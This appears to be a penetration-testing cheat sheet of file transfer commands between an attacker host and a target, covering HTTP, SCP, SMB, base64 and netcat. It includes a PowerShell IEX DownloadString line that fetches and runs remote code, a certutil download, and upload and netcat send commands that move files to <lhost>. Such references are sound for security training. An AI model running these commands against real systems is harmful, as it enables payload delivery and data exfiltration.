## Web Server

| Operation       | Command                                                                                    | Platform |
| --------------- | ------------------------------------------------------------------------------------------ | -------- |
| Host (files)    | `sudo python3 -m http.server <port>`                                                       | Linux    |
| Host (upload)   | `sudo python3 -m uploadserver <port>`                                                      | Linux    |
| Download        | `wget http://<lhost>:<port>/<file> -O /tmp/<file>`                                         | Linux    |
| Download        | `curl http://<lhost>:<port>/<file> -o /tmp/<file>`                                         | Linux    |
| Download        | `IEX (New-Object Net.WebClient).DownloadString('http://<lhost>:<port>/<file>')`            | Windows  |
| Download (disk) | `(New-Object Net.WebClient).DownloadFile('http://<lhost>:<port>/<file>','C:\Temp\<file>')` | Windows  |
| Download        | `certutil.exe -urlcache -split -f http://<lhost>:<port>/<file> C:\Temp\<file>`             | Windows  |
| Upload          | `curl -X POST http://<lhost>:<port>/upload -F 'files=@/tmp/<file>'`                        | Linux    |
| Upload          | `Invoke-WebRequest -Uri http://<lhost>:<port>/upload -Method POST -Body $b64`              | Windows  |

---
## SCP

| Operation | Command                                          | Platform |
| --------- | ------------------------------------------------ | -------- |
| Download  | `scp <user>@<target>:/tmp/<file> /tmp/<file>`    | Linux    |
| Download  | `scp <user>@<target>:/tmp/<file> C:\Temp\<file>` | Windows  |
| Upload    | `scp /tmp/<file> <user>@<target>:/tmp/<file>`    | Linux    |
| Upload    | `scp C:\Temp\<file> <user>@<target>:/tmp/<file>` | Windows  |

---
## SMB

| Operation | Command                                                                                            | Platform |
| --------- | -------------------------------------------------------------------------------------------------- | -------- |
| Host      | `impacket-smbserver -ip <lhost> -smb2support -username <user> -password <password> <share> <path>` | Linux    |
| Download  | `copy \\<lhost>\<share>\<file> C:\Temp\<file>`                                                     | Windows  |
| Upload    | `copy C:\Temp\<file> \\<lhost>\<share>\<file>`                                                     | Windows  |

---
## Base64

| Operation | Command                                                                              | Platform |
| --------- | ------------------------------------------------------------------------------------ | -------- |
| Encode    | `base64 -w 0 <file>`                                                                 | Linux    |
| Decode    | `echo <base64> \| base64 -d > <file>`                                                | Linux    |
| Encode    | `[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Temp\<file>'))`               | Windows  |
| Decode    | `[IO.File]::WriteAllBytes('C:\Temp\<file>',[Convert]::FromBase64String('<base64>'))` | Windows  |

---
## Netcat

| Operation | Command                                  | Platform |
| --------- | ---------------------------------------- | -------- |
| Receive   | `nc -lvnp <port> > <file>`               | Linux    |
| Send      | `nc <lhost> <port> < <file>`             | Linux    |
| Receive   | `nc.exe -lvnp <port> > C:\Temp\<file>`   | Windows  |
| Send      | `nc.exe <lhost> <port> < C:\Temp\<file>` | Windows  |